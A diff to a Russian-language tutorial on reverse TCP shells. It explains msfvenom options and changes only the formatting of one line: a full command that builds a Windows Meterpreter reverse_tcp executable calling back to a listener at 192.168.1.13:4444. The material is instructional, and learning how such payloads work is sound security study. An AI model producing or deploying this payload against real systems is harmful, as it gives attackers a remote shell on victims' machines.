@@ -10,5 +10,5 @@ Reverse TCP (обратное подключение, обратный шелл,
 * LPORT — порт вашего компьютера, который назначен серверу или программе.
 * P — сокращение от «payload», полезная нагрузка для выбранной платформы.
 * F — параметр, который задает тип файла, например, exe для Windows.
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.13 LPORT=4444 -f exe -a x64 -o /home/infosecaddicts/infoecaddicts.exe
+* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.13 LPORT=4444 -f exe -a x64 -o /home/infosecaddicts/infoecaddicts.exe
 
